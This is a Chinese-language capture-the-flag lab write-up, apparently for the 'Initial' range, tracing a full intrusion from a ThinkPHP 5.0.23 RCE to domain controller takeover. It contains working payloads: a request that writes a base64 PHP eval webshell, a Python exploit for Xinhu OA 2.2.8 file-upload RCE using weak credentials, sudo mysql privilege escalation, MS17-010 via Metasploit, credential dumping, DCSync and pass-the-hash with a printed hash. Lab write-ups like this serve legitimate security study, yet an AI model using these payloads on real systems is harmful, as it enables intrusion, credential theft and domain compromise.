# 攻击流程

## 信息收集

![image-20231212095736357](images/1.png)

发现了thinkphp5.0.23的rce

![image-20231212100006894](images/2.png)

## GetShell

直接用payload打

![image-20231212100351356](images/3.png)

```
http://39.101.165.215/index.php?s=captcha&test=-1

 _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
```

写一个马

```
 _method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=echo PD9waHAKZXZhbCgkX1BPU1RbMV0pOw==|base64 -d>1.php
```

![image-20231212100508714](images/4.png)

## SUID提权

连上蚁剑，目前用户是www-data，看看有没有什么方式可以提权的

![image-20231212100716140](images/5.png)

看到了mysql是不需要密码就可以root权限执行的

![image-20231212100752408](images/6.png)

```
sudo mysql -e '\! whoami'
sudo mysql -e '\! ls /root'
```

![image-20231212100856643](images/7.png)

看到了第一段的flag :`flag{60b53231-`

![image-20231212100941648](images/8.png)

接着来看内网其他机器

![image-20231212101135810](images/9.png)

看到了内网网段

## 内网信息收集和代理

上传fscan和stowoway

![image-20231212101830962](images/10.png)

fscan扫到了内网中存在另外两台机器172.22.1.21（存在ms17-010），以及172.22.1.18（信呼OA）

在VPS上收到了连接，开一个socks在7777

![image-20231212101736877](images/11.png)

## 攻击内网

### 信呼OA

配置proxifier后，直接访问，先打web

![image-20231212102435869](images/12.png)

信呼OA2.2.8，弱口令admin/admin123可以登录后台

![image-20231212102608565](images/13.png)

这个版本在后台可以上传文件RCE

```python
import requests

session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}
r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
data2 = {
    "1": "system('whoami');"
}
print(url_pre + filepath)
r = session.post(url_pre + filepath, data=data2)
print(r.text)

```

![image-20231212103115770](images/14.png)

蚁剑连接一下这个，找到了flag2:	`2ce3-4813-87d4-`

![image-20231212103300911](images/15.png)

发现这是一台域内机器，域控服务器是172.22.1.2

![image-20231212103203316](images/16.png)

### MS17-010

MS17-010还是用msf打最稳定

```
proxychains4 msfconsole

也可以直接set proxies socks5:127.0.0.1:7777
```

因为目标机器不出网，payload用`bind_tcp`

![image-20231212105517238](images/17.png)

抓取用户hash

```
load kiwi
creds_all
```

![image-20231212105700552](images/18.png)

## 域内信息收集

上传`SharpHound.exe`来搜集一下域内信息

```
upload "/root/SharpHound.exe" "C:/SharpHound.exe"

shell
chcp 65001

cd C:/
SharpHound.exe -c all

download "C:/20231212112608_BloodHound.zip" "/root/"
```

然后放在bloodhound里面分析

这里不知道为什么直接导入zip会出错，但是解压后不导入第一个computer就可以

![image-20231212134800467](images/19.png)

这里可能有点问题，但是我看别人在bloodhound中可以直接看到`XIAORANG-WIN7$`这台机器有DCSync权限

直接抓到了Administrator的hash

![image-20231212114056424](images/20.png)

用wmiexec登录

```
python3 wmiexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
```

![image-20231212114409242](images/21.png)

拿下域控

![image-20231212114459456](images/22.png)

而且这里有krbtgt的hash，可以用来做一个黄金票据

拿到了flag3

![image-20231212114800834](images/23.png)



```
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```



参考链接

https://github.com/H3rmesk1t/Security-Learning/blob/main/Penetration/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20%26%20Initial/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%20%26%20Initial.md

https://www.cnblogs.com/thebeastofwar/p/17754145.html